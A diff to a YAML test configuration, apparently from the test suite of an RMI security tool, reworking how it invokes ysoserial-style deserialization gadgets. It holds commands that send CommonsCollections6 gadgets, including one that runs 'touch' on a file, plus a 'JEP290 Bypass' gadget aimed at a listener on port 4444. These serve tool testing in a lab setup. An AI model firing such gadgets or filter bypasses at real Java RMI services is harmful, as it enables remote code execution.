@@ -20,9 +20,9 @@ plugins:
       background: True
       cmd:
         - rmg
+        - listen
         - 0.0.0.0
         - 4444
-        - listen
         - CommonsCollections6
         - 'touch ${volume-d}/${file}'
 
@@ -36,19 +36,22 @@ tests:
     groups:
       - ysoserial
 
-    command: '${BASE-CMD}'
-    arguments:
+    command:
+      - rmg
       - serial
+      - ${TARGET}
       - CommonsCollections6
       - ls
       - --component
       - reg
+      - ${OPTIONS}
+
     validators:
       - error: False
       - contains:
           values:
-            - rejected deserialization
-            - The specified gadget did not pass the deserialization filter
+            - Registry rejected deserialization
+            - The supplied gadget did not pass the deserialization filter
 
 
   - title: Gadget Call (SSL)
@@ -59,19 +62,22 @@ tests:
     groups:
       - ysoserial
 
-    command: '${BASE-CMD-SSL}'
-    arguments:
+    command:
+      - rmg
       - serial
+      - ${TARGET-SSL}
       - CommonsCollections6
       - ls
       - --component
       - reg
+      - ${OPTIONS}
+
     validators:
       - error: False
       - contains:
           values:
-            - rejected deserialization
-            - The specified gadget did not pass the deserialization filter
+            - Registry rejected deserialization
+            - The supplied gadget did not pass the deserialization filter
 
 
   - title: JEP290 Bypass
@@ -82,13 +88,16 @@ tests:
     groups:
       - ysoserial
 
-    command: '${BASE-CMD-SSL}'
-    arguments:
+    command:
+      - rmg
       - serial
+      - ${TARGET}
       - AnTrinh
       - ${DOCKER-GW}:4444
       - --component
       - reg
+      - ${OPTIONS}
+
     validators:
       - error: False
       - contains:
